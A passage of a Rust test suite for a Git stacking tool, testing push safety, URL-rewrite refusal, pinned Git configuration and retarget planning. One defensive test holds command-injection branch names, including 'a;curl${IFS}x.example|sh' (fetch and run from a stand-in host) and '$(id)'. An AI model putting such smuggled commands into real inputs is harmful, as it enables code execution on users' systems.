                    redirect_key(&remote, "remote.origin.pushurl")?
                ))),
                "{command:?}"
            );
        }
        assert!(!root.join("log").exists(), "gh stack ran");
        Ok(())
    }

    /// A stand-in for `git` that, on `push`, first runs `before` and then
    /// the real Git: a change another writer makes after every check and
    /// just before the push.
    fn git_moving_before_push(dir: &Path, before: &str) -> TestResult<std::path::PathBuf> {
        let path = dir.join("git-racing");
        common::executable::write_executable(
            &path,
            format!(
                "#!/bin/sh
if [ \"$1\" = push ]; then {before}; fi
exec {GIT} \"$@\"
"
            ),
        )?;
        Ok(path)
    }

    /// A real checkout and remote for the stack `main <- issue-4 <- issue-5`
    /// with pull requests 4 and 5, both layers pushed, and a new commit on
    /// the task's branch in the checkout. Returns the heads
    /// `[base, lower, top, next]`.
    fn pushed_stack(
        root: &Path,
    ) -> TestResult<(std::path::PathBuf, std::path::PathBuf, Vec<CommitId>)> {
        let (bare, worker) = granted_clone(root)?;
        let mut heads = Vec::new();
        for (name, message) in [
            ("main", "base"),
            ("lemarier/issue-4", "lower"),
            ("lemarier/issue-5", "top"),
        ] {
            if name != "main" {
                git(&worker, &["checkout", "-b", name])?;
            }
            git(&worker, &["commit", "--allow-empty", "-m", message])?;
            git(&worker, &["push", "origin", name])?;
            heads.push(CommitId::new(&git(&worker, &["rev-parse", "HEAD"])?)?);
        }
        git(&worker, &["commit", "--allow-empty", "-m", "next"])?;
        heads.push(CommitId::new(&git(&worker, &["rev-parse", "HEAD"])?)?);
        Ok((bare, worker, heads))
    }

    /// Pull requests 4 and 5 at the lower and top heads.
    fn stack_pull_requests(lower: &CommitId, top: &CommitId) -> TestResult<Layers> {
        let mut top_pr = pr_view(PullRequestState::Open)?;
        top_pr.head = top.clone();
        let mut lower_pr = layer_pr(4, "lemarier/issue-4", "main", 'a')?;
        lower_pr.head = lower.clone();
        Ok(Layers {
            pull_requests: BTreeMap::from([
                (4, Observed::Known(Some(lower_pr))),
                (5, Observed::Known(Some(top_pr))),
            ]),
            remote: BTreeMap::new(),
            local: BTreeMap::new(),
            included: BTreeMap::new(),
            answer: Ok(()),
            updated: RefCell::new(Vec::new()),
        })
    }

    const STACK_VIEW: &str = r#"{"trunk":"main","branches":[{"name":"lemarier/issue-4","pr":{"number":4}},{"name":"lemarier/issue-5","pr":{"number":5}}]}"#;

    /// Push the stack for the task on `issue-5` with `git` as Kitchen's Git.
    fn push_stack(
        worker: &Path,
        git_path: &Path,
        pull_requests: &Layers,
        command: &StackCommand,
        top: &CommitId,
    ) -> TestResult<StackOutcome> {
        push_viewed_stack(
            &stacking()?,
            worker,
            git_path,
            STACK_VIEW,
            pull_requests,
            command,
            top,
        )
    }

    /// [`push_stack`] for `setup`'s task, with `gh stack` viewing `view`
    /// and logging to the checkout's parent directory.
    fn push_viewed_stack(
        setup: &Stacking,
        worker: &Path,
        git_path: &Path,
        view: &str,
        pull_requests: &Layers,
        command: &StackCommand,
        top: &CommitId,
    ) -> TestResult<StackOutcome> {
        let root = worker.parent().ok_or("a checkout without a parent")?;
        let (gh, _kitchen) = adapter(fake_gh(root, view, 0)?, worker)?;
        let remote = gh
            .git_remote(git_path.to_path_buf(), Duration::from_secs(30))?
            .with_url_bases(&[&format!("{}/", text(root)?)])?;
        let intent = PushIntent {
            pull_request: Some(number(5)?),
            expected_remote: Some(top.clone()),
        };
        Ok(StackBoundary {
            store: &setup.world.fixture.store,
            grants: &setup.world.grants,
            destination: &setup.github,
            clock: &setup.world.clock,
            runner: &gh,
            pull_requests,
            remote: &remote,
            updater: &remote,
            local: &remote,
            opener: None,
        }
        .run(&setup.task, setup.fence, command, &intent)?)
    }

    /// The branches of `bare`, as `(name, head)`.
    fn remote_heads(bare: &Path) -> TestResult<String> {
        git(
            bare,
            &[
                "for-each-ref",
                "--format=%(refname) %(objectname)",
                "refs/heads",
            ],
        )
    }

    /// What `gh` was asked to do, without the prompt lines.
    fn gh_calls(root: &Path) -> TestResult<Vec<String>> {
        Ok(fs::read_to_string(root.join("log"))?
            .lines()
            .filter(|line| line.starts_with("stack "))
            .map(str::to_owned)
            .collect())
    }

    /// Real Git: the boundary pushes the layers itself, the task's branch
    /// moving and the lower layer held at its checked head, and `gh stack`
    /// only views and links.
    #[test]
    fn a_stack_push_updates_the_layers_through_kitchens_own_git() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker, heads) = pushed_stack(&root)?;
        let [base, lower, top, next] = heads.as_slice() else {
            return Err("four heads".into());
        };
        let pull_requests = stack_pull_requests(lower, top)?;
        for command in [StackCommand::Push, StackCommand::Submit { ready: true }] {
            git(
                &bare,
                &["update-ref", "refs/heads/lemarier/issue-5", top.as_str()],
            )?;
            assert_eq!(
                push_stack(&worker, Path::new(GIT), &pull_requests, &command, top)?,
                StackOutcome::Ran(StackResult::Done),
                "{command:?}"
            );
            assert_eq!(
                remote_heads(&bare)?,
                format!(
                    "refs/heads/lemarier/issue-4 {lower}\nrefs/heads/lemarier/issue-5 {next}\n\
                     refs/heads/main {base}"
                ),
                "{command:?}"
            );
        }
        assert_eq!(
            gh_calls(&root)?,
            vec![
                "stack view --json",
                "stack view --json",
                "stack link --base main --open --remote origin 4 5",
            ]
        );
        Ok(())
    }

    /// Real Git: a submission whose task layer has no pull request is
    /// refused before any push, so `gh stack` never receives a branch to
    /// push. Every link it does receive names pull requests by number.
    #[test]
    fn a_layer_without_a_pull_request_refuses_a_submission_before_any_push() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker, heads) = pushed_stack(&root)?;
        let [_, lower, top, _] = heads.as_slice() else {
            return Err("four heads".into());
        };
        let before = remote_heads(&bare)?;
        let pull_requests = stack_pull_requests(lower, top)?;
        let setup = stacking()?;
        let view = r#"{"trunk":"main","branches":[{"name":"lemarier/issue-4","pr":{"number":4}},{"name":"lemarier/issue-5"}]}"#;
        let (gh, _kitchen) = adapter(fake_gh(&root, view, 0)?, &worker)?;
        let remote = gh
            .git_remote(Path::new(GIT).to_path_buf(), Duration::from_secs(30))?
            .with_url_bases(&[&format!("{}/", text(&root)?)])?;
        let intent = PushIntent {
            pull_request: None,
            expected_remote: Some(top.clone()),
        };
        let outcome = StackBoundary {
            store: &setup.world.fixture.store,
            grants: &setup.world.grants,
            destination: &setup.github,
            clock: &setup.world.clock,
            runner: &gh,
            pull_requests: &pull_requests,
            remote: &remote,
            updater: &remote,
            local: &remote,
            opener: None,
        }
        .run(
            &setup.task,
            setup.fence,
            &StackCommand::Submit { ready: false },
            &intent,
        )?;
        assert_eq!(
            outcome,
            StackOutcome::Refused(StackRefusal::NoPullRequest {
                branch: branch("lemarier/issue-5")?,
            })
        );
        assert_eq!(remote_heads(&bare)?, before, "a layer was pushed");
        assert_eq!(gh_calls(&root)?, vec!["stack view --json"]);
        Ok(())
    }

    /// Real Git: with an opener, the same submission pushes the layers
    /// first, then opens the task layer's pull request at the pushed head
    /// with the head commit's message as its text, and `gh stack` receives
    /// only pull-request numbers.
    #[test]
    fn a_layer_without_a_pull_request_is_opened_after_the_push_and_linked_by_number() -> TestResult
    {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker, heads) = pushed_stack(&root)?;
        let [base, lower, top, next] = heads.as_slice() else {
            return Err("four heads".into());
        };
        let pull_requests = stack_pull_requests(lower, top)?;
        let setup = stacking()?;
        let view = r#"{"trunk":"main","branches":[{"name":"lemarier/issue-4","pr":{"number":4}},{"name":"lemarier/issue-5"}]}"#;
        let (gh, _kitchen) = adapter(fake_gh(&root, view, 0)?, &worker)?;
        let remote = gh
            .git_remote(Path::new(GIT).to_path_buf(), Duration::from_secs(30))?
            .with_url_bases(&[&format!("{}/", text(&root)?)])?;
        let forge = Forge::new(&pull_requests.updated)?;
        let outcome = StackBoundary {
            store: &setup.world.fixture.store,
            grants: &setup.world.grants,
            destination: &setup.github,
            clock: &setup.world.clock,
            runner: &gh,
            pull_requests: &pull_requests,
            remote: &remote,
            updater: &remote,
            local: &remote,
            opener: Some(LayerOpener {
                forge: &forge,
                consent: &Standing,
                text: &remote,
            }),
        }
        .run(
            &setup.task,
            setup.fence,
            &StackCommand::Submit { ready: false },
            &PushIntent {
                pull_request: None,
                expected_remote: Some(top.clone()),
            },
        )?;
        assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
        assert_eq!(
            remote_heads(&bare)?,
            format!(
                "refs/heads/lemarier/issue-4 {lower}\nrefs/heads/lemarier/issue-5 {next}\n\
                 refs/heads/main {base}"
            )
        );
        assert_eq!(
            forge.actions(),
            vec![GitHubAction::OpenPullRequest {
                head: branch("lemarier/issue-5")?,
                expected_head: next.clone(),
                base: branch("lemarier/issue-4")?,
                title: Text::new("next")?,
                body: Text::new("next")?,
                draft: true,
            }]
        );
        assert_eq!(
            gh_calls(&root)?,
            vec![
                "stack view --json",
                "stack link --base main --remote origin 4 7"
            ]
        );
        Ok(())
    }

    /// Real Git: a layer above the task's branch whose remote head another
    /// writer advanced is never rewound to the checkout's stale head, whether
    /// or not the checkout fetched that head; one whose pull request merged
    /// and whose branch was deleted is never recreated; and one the checkout
    /// rebased from its remote head is pushed.
    #[test]
    fn an_upper_layer_is_never_rewound_or_recreated_by_a_stack_push() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker, heads) = pushed_stack(&root)?;
        let [_, lower, top, next] = heads.as_slice() else {
            return Err("four heads".into());
        };
        let setup = stacking()?;
        settled_layer(&setup, 6, "lemarier/issue-6")?;
        git(&worker, &["checkout", "-b", "lemarier/issue-6"])?;
        git(&worker, &["commit", "--allow-empty", "-m", "upper"])?;
        git(&worker, &["push", "origin", "lemarier/issue-6"])?;
        let upper = git(&worker, &["rev-parse", "HEAD"])?;
        // Another writer adds a commit to the upper layer.
        let other = root.join("other");
        git(&root, &["clone", text(&bare)?, text(&other)?])?;
        git(&other, &["checkout", "lemarier/issue-6"])?;
        git(&other, &["commit", "--allow-empty", "-m", "theirs"])?;
        git(&other, &["push", "origin", "lemarier/issue-6"])?;
        let theirs = git(&other, &["rev-parse", "HEAD"])?;
        let upper_remote = |bare: &Path| {
            git(
                bare,
                &[
                    "for-each-ref",
                    "--format=%(objectname)",
                    "refs/heads/lemarier/issue-6",
                ],
            )
        };
        let mut pull_requests = stack_pull_requests(lower, top)?;
        pull_requests.pull_requests.insert(
            6,
            Observed::Known(Some(layer_pr(
                6,
                "lemarier/issue-6",
                "lemarier/issue-5",
                'a',
            )?)),
        );
        let view = r#"{"trunk":"main","branches":[{"name":"lemarier/issue-4","pr":{"number":4}},{"name":"lemarier/issue-5","pr":{"number":5}},{"name":"lemarier/issue-6","pr":{"number":6}}]}"#;
        let push = |pull_requests: &Layers| {
            push_viewed_stack(
                &setup,
                &worker,
                Path::new(GIT),
                view,
                pull_requests,
                &StackCommand::Push,
                top,
            )
        };
        let not_integrated = StackOutcome::Refused(StackRefusal::UpperLayer {
            branch: branch("lemarier/issue-6")?,
            fault: UpperLayerFault::NotIntegrated,
        });
        // Before and after the checkout fetches their commit, its branch
        // still lacks it.
        assert_eq!(push(&pull_requests)?, not_integrated, "unfetched");
        git(&worker, &["fetch", "origin"])?;
        assert_eq!(push(&pull_requests)?, not_integrated, "fetched");
        assert_eq!(upper_remote(&bare)?, theirs);
        assert_ne!(upper, theirs);
        // The pull request merged and the forge deleted the branch.
        git(&bare, &["update-ref", "-d", "refs/heads/lemarier/issue-6"])?;
        let mut merged = stack_pull_requests(lower, top)?;
        let mut merged_pr = layer_pr(6, "lemarier/issue-6", "lemarier/issue-5", 'a')?;
        merged_pr.state = PullRequestState::Merged;
        merged
            .pull_requests
            .insert(6, Observed::Known(Some(merged_pr)));
        assert_eq!(
            push(&merged)?,
            StackOutcome::Refused(StackRefusal::UpperLayer {
                branch: branch("lemarier/issue-6")?,
                fault: UpperLayerFault::NotOpen(PullRequestState::Merged),
            })
        );
        assert_eq!(upper_remote(&bare)?, "", "the deleted branch came back");
        // Restored, and the checkout takes their commit and rewrites it: the
        // replaced head is in the branch's reflog, so the push replaces it.
        git(&other, &["push", "origin", "lemarier/issue-6"])?;
        git(&worker, &["reset", "--hard", "origin/lemarier/issue-6"])?;
        git(
            &worker,
            &["commit", "--amend", "--allow-empty", "-m", "rewritten"],
        )?;
        let rewritten = git(&worker, &["rev-parse", "HEAD"])?;
        assert_eq!(push(&pull_requests)?, StackOutcome::Ran(StackResult::Done));
        assert_eq!(upper_remote(&bare)?, rewritten);
        assert_eq!(
            git(&bare, &["rev-parse", "refs/heads/lemarier/issue-5"])?,
            next.as_str()
        );
        Ok(())
    }

    /// Real Git: a branch includes a commit in its history or its reflog,
    /// not one outside both or one the checkout lacks; an unreadable branch
    /// is unknown.
    #[test]
    fn a_branch_includes_its_history_and_reflog_only() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (_, worker) = granted_clone(&root)?;
        let mut commits = Vec::new();
        for message in ["first", "second"] {
            git(&worker, &["commit", "--allow-empty", "-m", message])?;
            commits.push(CommitId::new(&git(&worker, &["rev-parse", "HEAD"])?)?);
        }
        let [first, second] = commits.as_slice() else {
            return Err("two commits".into());
        };
        // Created at the second commit: its reflog holds only that one.
        git(&worker, &["branch", "lemarier/layer", second.as_str()])?;
        // A commit on another branch, which the layer never pointed at.
        git(
            &worker,
            &["checkout", "-b", "lemarier/aside", first.as_str()],
        )?;
        git(&worker, &["commit", "--allow-empty", "-m", "aside"])?;
        let aside = CommitId::new(&git(&worker, &["rev-parse", "HEAD"])?)?;
        let (gh, _kitchen) = adapter(fake_gh(&root, "", 0)?, &worker)?;
        let local = gh.git_remote(GIT.into(), Duration::from_secs(30))?;
        let layer = branch("lemarier/layer")?;
        assert_eq!(local.includes(&layer, first), Observed::Known(true));
        assert_eq!(local.includes(&layer, second), Observed::Known(true));
        assert_eq!(local.includes(&layer, &aside), Observed::Known(false));
        assert_eq!(
            local.includes(&layer, &commit('f')?),
            Observed::Known(false),
            "a commit the checkout lacks"
        );
        // Reset the layer to it and back: now in the layer's reflog.
        git(&worker, &["branch", "-f", "lemarier/layer", aside.as_str()])?;
        git(
            &worker,
            &["branch", "-f", "lemarier/layer", second.as_str()],
        )?;
        assert_eq!(local.includes(&layer, &aside), Observed::Known(true));
        assert_eq!(
            local.includes(&branch("lemarier/missing")?, first),
            Observed::Unknown
        );
        Ok(())
    }

    /// Real Git: a lower layer rewritten on the remote before the check
    /// refuses the push with the layer named; one rewritten after every
    /// check and just before the push fails the atomic push, so neither
    /// layer changes and nothing is linked.
    #[test]
    fn a_lower_layer_moved_before_or_during_a_stack_push_updates_nothing() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker, heads) = pushed_stack(&root)?;
        let [base, lower, top, _] = heads.as_slice() else {
            return Err("four heads".into());
        };
        let pull_requests = stack_pull_requests(lower, top)?;
        let moved = format!(
            "refs/heads/lemarier/issue-4 {base}\nrefs/heads/lemarier/issue-5 {top}\n\
             refs/heads/main {base}"
        );
        // Moved before the check.
        git(
            &bare,
            &["update-ref", "refs/heads/lemarier/issue-4", base.as_str()],
        )?;
        assert_eq!(
            push_stack(
                &worker,
                Path::new(GIT),
                &pull_requests,
                &StackCommand::Push,
                top
            )?,
            StackOutcome::Refused(StackRefusal::LowerLayer {
                branch: branch("lemarier/issue-4")?,
                fault: LowerLayerFault::HeadMoved,
            })
        );
        assert_eq!(remote_heads(&bare)?, moved);
        // Moved after the check, right before the push.
        let racing = git_moving_before_push(
            &root,
            &format!(
                "{GIT} -C '{}' update-ref refs/heads/lemarier/issue-4 {base}",
                bare.display()
            ),
        )?;
        for command in [StackCommand::Push, StackCommand::Submit { ready: false }] {
            git(
                &bare,
                &["update-ref", "refs/heads/lemarier/issue-4", lower.as_str()],
            )?;
            assert_eq!(
                push_stack(&worker, &racing, &pull_requests, &command, top)?,
                StackOutcome::Ran(StackResult::Stale),
                "{command:?}"
            );
            assert_eq!(remote_heads(&bare)?, moved, "{command:?}: a layer changed");
        }
        assert!(
            gh_calls(&root)?
                .iter()
                .all(|call| call == "stack view --json"),
            "gh stack pushed or linked"
        );
        Ok(())
    }

    /// The key the remote reports as redirecting, checked against `expected`.
    fn redirect_key(remote: &GitRemote, expected: &str) -> TestResult<GitConfigKey> {
        let Observed::Known(Some(key)) = remote.redirect(&workflows_support::repo()?) else {
            return Err("no redirecting key".into());
        };
        assert_eq!(key.as_str(), expected);
        Ok(key)
    }

    /// The chained rewrite: origin is an alias rewritten to the granted URL,
    /// and the granted URL is rewritten to another repository. `gh stack`
    /// pushes by remote name through its own Git, so the boundary must
    /// refuse before it runs.
    #[test]
    fn a_chained_rewrite_is_refused_before_gh_stack_runs() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker) = granted_clone(&root)?;
        let elsewhere = root.join("elsewhere").join("firmware.git");
        fs::create_dir_all(&elsewhere)?;
        git(&elsewhere, &["init", "--bare"])?;
        let granted = text(&bare)?.to_owned();
        git(&worker, &["remote", "set-url", "origin", "alias:"])?;
        git(
            &worker,
            &["config", &format!("url.{granted}.insteadOf"), "alias:"],
        )?;
        git(
            &worker,
            &[
                "config",
                &format!("url.{}.insteadOf", text(&elsewhere)?),
                &granted,
            ],
        )?;
        let setup = stacking()?;
        let (gh, _kitchen) = adapter(fake_gh(&root, "", 0)?, &worker)?;
        let remote = gh
            .git_remote(GIT.into(), Duration::from_secs(30))?
            .with_url_bases(&[&format!("{}/", text(&root)?)])?;
        let outcome = StackBoundary {
            store: &setup.world.fixture.store,
            grants: &setup.world.grants,
            destination: &setup.github,
            clock: &setup.world.clock,
            runner: &gh,
            pull_requests: &Remote::open()?,
            remote: &remote,
            updater: &remote,
            local: &remote,
            opener: None,
        }
        .run(&setup.task, setup.fence, &StackCommand::Push, &intent()?)?;
        assert_eq!(
            outcome,
            StackOutcome::Refused(StackRefusal::Push(PushRefusal::CheckoutRedirect(
                redirect_key(&remote, &format!("url.{granted}.insteadof"))?
            )))
        );
        assert!(!root.join("log").exists(), "gh stack ran");
        Ok(())
    }

    /// `gh stack` runs its Git under the environment every Kitchen push
    /// uses: the Git it starts reads no system configuration, takes Kitchen's
    /// file as its global configuration, and sees Kitchen's credential
    /// helper and no other.
    #[test]
    fn gh_stack_runs_git_under_kitchens_configuration() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (_, worker) = granted_clone(&root)?;
        let kitchen = tempfile::tempdir()?;
        let config = workflows_support::isolated_config(
            kitchen.path(),
            &[PushSetting::CredentialHelper {
                url: None,
                helper: "kitchen-helper".to_owned(),
            }],
        )?;
        let log = root.join("scopes");
        let gh_path = root.join("gh");
        common::executable::write_executable(
            &gh_path,
            format!(
                "#!/bin/sh
                 {GIT} config --show-scope --show-origin --get-all credential.helper > '{log}'
                 {GIT} config --show-scope --list | cut -f1 | sort -u >> '{log}'
",
                log = log.display()
            ),
        )?;
        let gh = GhStack::new(
            gh_path,
            worker,
            "origin",
            config.clone(),
            Duration::from_secs(5),
        )?;
        let env = gh.env();
        for (key, value) in [
            ("GIT_CONFIG_NOSYSTEM", "1"),
            ("GIT_CONFIG_GLOBAL", text(config.path())?),
        ] {
            assert!(
                env.iter().any(|(k, v)| k == key && v == value),
                "{key} missing from {env:?}"
            );
        }
        assert_eq!(gh.run(&StackCommand::Push), StackResult::Done);
        assert_eq!(
            fs::read_to_string(&log)?,
            format!(
                "global\tfile:{}\tkitchen-helper\ncommand\tcommand line:\t\ncommand\tcommand line:\tkitchen-helper\ncommand\nglobal\nlocal\n",
                text(config.path())?
            ),
            "only Kitchen's file, the checkout's own, and Kitchen's pins"
        );
        Ok(())
    }

    #[test]
    fn gh_stack_runs_git_with_the_pinned_configuration() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (_, worker) = granted_clone(&root)?;
        // The worker's checkout asks for hooks, tags, and submodules.
        for (key, value) in [
            ("core.hooksPath", "/tmp/worker-hooks"),
            ("core.sshCommand", "worker-ssh"),
            ("push.followTags", "true"),
            ("push.recurseSubmodules", "on-demand"),
            ("remote.origin.mirror", "true"),
        ] {
            git(&worker, &["config", key, value])?;
        }
        // A stand-in `gh` whose own Git reads the configuration it would push
        // with.
        let gh_path = root.join("gh");
        common::executable::write_executable(
            &gh_path,
            format!(
                "#!/bin/sh\nfor key in core.hooksPath core.sshCommand push.followTags \
                 push.recurseSubmodules remote.origin.mirror; do\n  \
                 echo \"$key=$({GIT} config --get $key)\" >> '{log}'\ndone\n",
                log = root.join("config-log").display()
            ),
        )?;
        let (gh, _kitchen) = adapter(gh_path, &worker)?;
        assert_eq!(gh.run(&StackCommand::Push), StackResult::Done);
        assert_eq!(
            fs::read_to_string(root.join("config-log"))?,
            "core.hooksPath=/dev/null\ncore.sshCommand=ssh\npush.followTags=false\n\
             push.recurseSubmodules=no\nremote.origin.mirror=false\n"
        );
        Ok(())
    }
}

// Doctor.

#[test]
fn doctor_blocks_stacking_workflows_until_the_stack_tool_is_installed() -> TestResult {
    let stacking = BTreeSet::from([Workflow::Pickup, Workflow::Gate]);
    let missing = stack_tool_finding(
        StackTool::GhStack,
        &stacking,
        Some(&StackToolStatus::Missing),
    )
    .ok_or("missing tool not reported")?;
    assert_eq!(missing.code, DoctorCode::StackTool);
    assert!(missing.message.contains("gh stack"));
    assert!(missing.message.contains("pickup"));
    let unprobed =
        stack_tool_finding(StackTool::GhStack, &stacking, None).ok_or("unprobed tool accepted")?;
    assert_eq!(unprobed.code, DoctorCode::StackTool);
    assert_eq!(
        stack_tool_finding(
            StackTool::GhStack,
            &stacking,
            Some(&StackToolStatus::Installed {
                version: "0.1.0".to_owned()
            })
        ),
        None
    );
    // A repository that creates no dependent pull requests does not need it.
    assert_eq!(
        stack_tool_finding(
            StackTool::GhStack,
            &BTreeSet::from([Workflow::Gate, Workflow::Triage]),
            Some(&StackToolStatus::Missing)
        ),
        None
    );
    Ok(())
}

// Retargeting after a base merged.

fn number(value: u64) -> TestResult<IssueNumber> {
    Ok(IssueNumber::new(value)?)
}

fn merged() -> TestResult<MergedBase> {
    Ok(MergedBase {
        pull_request: number(41)?,
        branch: branch("lemarier/a")?,
        into: branch("main")?,
        head: commit('a')?,
    })
}

fn dependent(pr: u64, name: &str, base: &str, head: char) -> TestResult<Dependent> {
    Ok(Dependent {
        pull_request: number(pr)?,
        branch: branch(name)?,
        base: branch(base)?,
        head: commit(head)?,
    })
}

#[test]
fn a_squash_merged_base_retargets_first_and_instructs_each_writer() -> TestResult {
    let dependents = [
        // Out of order, plus an unrelated pull request.
        dependent(43, "lemarier/c", "lemarier/b", 'c')?,
        dependent(42, "lemarier/b", "lemarier/a", 'b')?,
        dependent(50, "lemarier/other", "main", 'e')?,
    ];
    let plan = plan_retarget(None, &merged()?, &dependents)?;
    assert_eq!(
        plan.steps,
        vec![
            RetargetStep::Retarget {
                pull_request: number(42)?,
                from: branch("lemarier/a")?,
                to: branch("main")?,
            },
            RetargetStep::RebaseOnto {
                branch: branch("lemarier/b")?,
                onto: branch("main")?,
                upstream: commit('a')?,
            },
            RetargetStep::RebaseOnto {
                branch: branch("lemarier/c")?,
                onto: branch("lemarier/b")?,
                upstream: commit('b')?,
            },
        ]
    );
    assert_eq!(plan.delete_after, branch("lemarier/a")?);
    let instructions: Vec<String> = plan
        .steps
        .iter()
        .filter_map(RetargetStep::instruction)
        .collect();
    assert_eq!(
        instructions,
        vec![
            format!("git rebase --onto main {} lemarier/b", commit('a')?),
            format!("git rebase --onto lemarier/b {} lemarier/c", commit('b')?),
        ]
    );
    Ok(())
}

#[test]
fn a_stacked_repair_goes_through_the_stack_tool() -> TestResult {
    let dependents = [
        dependent(42, "lemarier/b", "lemarier/a", 'b')?,
        dependent(43, "lemarier/c", "lemarier/b", 'c')?,
    ];
    let plan = plan_retarget(Some(StackTool::GhStack), &merged()?, &dependents)?;
    assert_eq!(
        plan.steps,
        vec![RetargetStep::StackTool {
            branch: branch("lemarier/b")?,
            commands: vec![
                StackCommand::RebaseUpstack,
                StackCommand::Submit { ready: false }
            ],
        }]
    );
    // No plain retarget or rebase is planned, and the plain paths refuse.
    assert!(plan.steps.iter().all(|step| step.instruction().is_none()));
    assert!(
        check_plain(
            Some(StackTool::GhStack),
            &BranchLayer::Dependent {
                parent: branch("lemarier/a")?
            },
            BranchOperation::Retarget
        )
        .is_err()
    );
    Ok(())
}

#[test]
fn a_retarget_needs_a_linear_chain() -> TestResult {
    let plan = plan_retarget(None, &merged()?, &[])?;
    assert!(plan.steps.is_empty());
    let forked = [
        dependent(42, "lemarier/b", "lemarier/a", 'b')?,
        dependent(43, "lemarier/c", "lemarier/a", 'c')?,
    ];
    assert_eq!(
        plan_retarget(None, &merged()?, &forked),
        Err(StackRefusal::InvalidLayers)
    );
    let long: Vec<Dependent> = (0..=MAX_STACK_LAYERS)
        .map(|layer| {
            let base = if layer == 0 {
                "lemarier/a".to_owned()
            } else {
                format!("lemarier/l{}", layer - 1)
            };
            dependent(
                60 + u64::try_from(layer)?,
                &format!("lemarier/l{layer}"),
                &base,
                'd',
            )
        })
        .collect::<TestResult<_>>()?;
    assert_eq!(
        plan_retarget(None, &merged()?, &long),
        Err(StackRefusal::InvalidLayers)
    );
    Ok(())
}

#[test]
fn a_hostile_branch_name_from_pull_request_data_never_becomes_shell_text() -> TestResult {
    // Git accepts these names; a shell would run the part after `;` or `$(`.
    let hostile = BranchName::new("a;curl${IFS}x.example|sh")?;
    let substitution = BranchName::new("lemarier/$(id)")?;
    let chains = [
        vec![Dependent {
            branch: hostile.clone(),
            ..dependent(42, "lemarier/b", "lemarier/a", 'b')?
        }],
        vec![
            dependent(42, "lemarier/b", "lemarier/a", 'b')?,
            Dependent {
                branch: substitution.clone(),
                ..dependent(43, "lemarier/c", "lemarier/b", 'c')?
            },
        ],
    ];
    for dependents in &chains {
        for tool in [None, Some(StackTool::GhStack)] {
            assert_eq!(
                plan_retarget(tool, &merged()?, dependents),
                Err(StackRefusal::UnsafeBranchName)
            );
        }
    }
    // A merged base or target from pull-request data is checked too.
    let bad_base = MergedBase {
        branch: substitution.clone(),
        ..merged()?
    };
    let on_bad = [Dependent {
        base: substitution.clone(),
        ..dependent(42, "lemarier/b", "lemarier/a", 'b')?
    }];
    assert_eq!(
        plan_retarget(None, &bad_base, &on_bad),
        Err(StackRefusal::UnsafeBranchName)
    );
    // A step built directly still yields no shell text, only arguments.
    let step = RetargetStep::RebaseOnto {
        branch: hostile.clone(),
        onto: branch("main")?,
        upstream: commit('a')?,
    };
    assert_eq!(step.instruction(), None);
    assert_eq!(
        step.args(),
        Some(vec![
            "git".to_owned(),
            "rebase".to_owned(),
            "--onto".to_owned(),
            "main".to_owned(),
            commit('a')?.to_string(),
            hostile.to_string(),
        ])
    );
    Ok(())
}

// Opening a layer's missing pull request.

use kitchen::{
    contracts::{
        BackendDescriptor, BackendUnavailable, Capability, CapabilitySet, Effect, EffectExecutor,
        EffectFailure, EffectRequest, ExternalRef, GitHubAction, GitHubEffect, GitHubMutation,
        Lookup, NotAppliedReason, PostingBudget, Receipt, Text, UncertainReason,
    },
    state::{EffectState, reconcile},
    workflows::{
        coordination::Standing,
        interactive::ForgeWriter,
        stack::{LayerOpener, LayerText, MAX_TITLE_BYTES, PullRequestText},
    },
};

/// A forge that numbers each pull request it opens from 7 upward, records
/// every open with how many layer pushes preceded it, and fails an open
/// with the next scripted failure first.
struct Forge<'a> {
    descriptor: BackendDescriptor,
    pushes: &'a RefCell<Vec<LayerCall>>,
    failures: RefCell<Vec<EffectFailure>>,
    opened: RefCell<Vec<(GitHubAction, usize)>>,
    /// What a lookup answers.
    found: RefCell<Lookup>,
}

impl<'a> Forge<'a> {
    fn new(pushes: &'a RefCell<Vec<LayerCall>>) -> TestResult<Self> {
        Ok(Self {
            descriptor: BackendDescriptor {
                backend: BackendId::new("github")?,
                house: common::house()?,
                worker_selection: None,
                capabilities: CapabilitySet::supporting([
                    Capability::ForgeMutation,
                    Capability::EffectLookup,
                ]),
            },
            pushes,
            failures: RefCell::new(Vec::new()),
            opened: RefCell::new(Vec::new()),
            found: RefCell::new(Lookup::Unknown),
        })
    }

    fn failing(self, failure: EffectFailure) -> Self {
        self.failures.borrow_mut().push(failure);
        self
    }

    fn actions(&self) -> Vec<GitHubAction> {
        self.opened
            .borrow()
            .iter()
            .map(|(action, _)| action.clone())
            .collect()
    }
}

fn pull_url(number: usize) -> TestResult<ExternalRef> {
    Ok(ExternalRef::new(&format!(
        "https://github.com/origin89hq/firmware/pull/{number}"
    ))?)
}

impl EffectExecutor for Forge<'_> {
    fn descriptor(&self) -> &BackendDescriptor {
        &self.descriptor
    }

    fn execute(&self, request: &EffectRequest) -> Result<Receipt, EffectFailure> {
        let Effect::GitHub(effect) = request.effect() else {
            return Err(EffectFailure::NotApplied(NotAppliedReason::Rejected));
        };
        let mut opened = self.opened.borrow_mut();
        opened.push((effect.mutation.action.clone(), self.pushes.borrow().len()));
        if let Some(failure) = self.failures.borrow_mut().pop() {
            return Err(failure);
        }
        pull_url(opened.len().saturating_add(6))
            .and_then(|url| Ok(Receipt::new(url, vec![], vec![])?))
            .map_err(|_| EffectFailure::Uncertain(UncertainReason::ResponseLost))
    }

    fn lookup(&self, _: &EffectRequest) -> Result<Lookup, BackendUnavailable> {
        Ok(self.found.borrow().clone())
    }
}

impl ForgeWriter for Forge<'_> {
    fn github_effect(&self, mutation: GitHubMutation) -> Result<GitHubEffect, kitchen::Error> {
        Ok(GitHubEffect {
            requester: ExternalRef::new("sample-bot")?,
            mutation,
